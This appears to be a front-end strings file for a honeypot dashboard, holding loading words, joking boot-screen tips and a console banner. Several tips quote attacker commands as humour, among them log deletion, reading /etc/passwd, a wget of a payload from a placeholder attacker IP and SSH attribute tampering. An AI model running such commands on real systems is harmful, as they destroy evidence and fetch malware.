/**
 * All the voice in one file.
 *
 * The dashboard shows real attacks against a real box, so the *data* stays
 * straight — counts, timestamps and technique labels are never jokes. The
 * chrome around it does not have to be. Keeping every playful string here
 * means the tone can be tuned, toned down or swapped wholesale without
 * touching a component.
 */

/**
 * Rotating status words, in the spirit of Claude Code's loading verbs.
 *
 * "hunajapannu" is Finnish for honey pot, so the list leans on both halves:
 * things a honeypot does to attackers, and things you do to honey.
 */
export const LOADING_WORDS = [
  // what the trap is doing
  "Baiting", "Luring", "Ensnaring", "Tarpitting", "Sinkholing", "Decoying",
  "Fingerprinting", "Enumerating", "Triaging", "Correlating", "Snooping",
  "Profiling", "Trapping", "Lurking",
  // what the pot is doing
  "Simmering", "Steeping", "Brewing", "Percolating", "Marinating",
  "Thickening", "Drizzling", "Caramelising",
  // what we are all doing
  "Vibing", "Doomscrolling", "Snitching", "Rummaging", "Eavesdropping",
];

/** Tips shown on the boot screen. Kept in the project's existing register. */
export const BOOT_MESSAGES = [
  { label: "Tip #404", detail: "uname -s -v -n -m? Red flag fr fr." },
  { label: "NPC Behavior", detail: "cat /proc/uptime" },
  { label: "🚨 SUS ALERT", detail: "Why is bro echoing base64 again?" },
  { label: "Pro Hacker Tip", detail: "root:root" },
  { label: "Loading", detail: "Trust the process." },
  { label: "Pro Hacker Tip", detail: "rm -rf /var/log/*" },
  { label: "Pro Tip", detail: "cat /etc/passwd | grep root" },
  { label: "Threat Intel", detail: "The call is coming from AS14061." },
  { label: "Password Meta", detail: "123456 is still undefeated. 68k attempts." },
  { label: "OPSEC L", detail: "chattr -ia .ssh then leaving the authorized_keys. Bold." },
  { label: "Reminder", detail: "This box has nothing on it. They keep trying anyway." },
  { label: "Certified Bruh Moment", detail: "wget http://<attacker-ip>/bins.sh — no TLS, no shame." },
  { label: "Hot Take", detail: "Telnet in 2026 is a lifestyle choice." },
  { label: "Field Note", detail: "Average session: 3 seconds. Attention spans are cooked." },
  { label: "Tip #200", detail: "If you can read this, the API answered in under a second." },
];

/**
 * Empty-state copy. Each pair is { line, hint } so the joke sits on top and
 * the actually-useful explanation sits underneath it, rather than replacing it.
 */
export const EMPTY_STATES = {
  events: {
    line: "No events yet — waiting for attackers...",
    hint: "Usually under a minute. They are very reliable.",
  },
  sessionsSearch: {
    line: "No sessions match that search.",
    hint: "Try an IP, a country code, or a username.",
  },
  sessions: {
    line: "No sessions in the last 24 hours.",
    hint: "Suspiciously quiet. Enjoy it while it lasts.",
  },
};

/**
 * Banner for anyone who opens DevTools — which, on a security project, is a
 * fair share of the audience. Cheap to ship, and the sort of thing the people
 * this site is aimed at will actually look for.
 */
export function printConsoleBanner() {
  if (typeof console === "undefined") return;
  const honey = "color:#fbbf24;font-weight:bold";
  const green = "color:#34d399";
  const dim = "color:#065f46";

  console.log(
    "%c🍯 hunajapannu.fi%c — a real SSH/Telnet honeypot, wired to a real dashboard.\n" +
      "%cYou opened the console. Respect. Here is everything:\n\n" +
      "%c  source   %chttps://github.com/OskariKosonen/hunajapannu\n" +
      "%c  api      %chttps://hunajapannu.fi/api/public/cowrie/summary\n" +
      "%c  live     %chttps://hunajapannu.fi/api/public/cowrie/latest?limit=5\n\n" +
      "%cThe whole public API is open and unauthenticated. Go on.\n" +
      "%cNo, your password is not sent anywhere. Only 3 chars of its SHA-256. Check the source.",
    honey, green, dim, dim, green, dim, green, dim, green, green, dim
  );
}
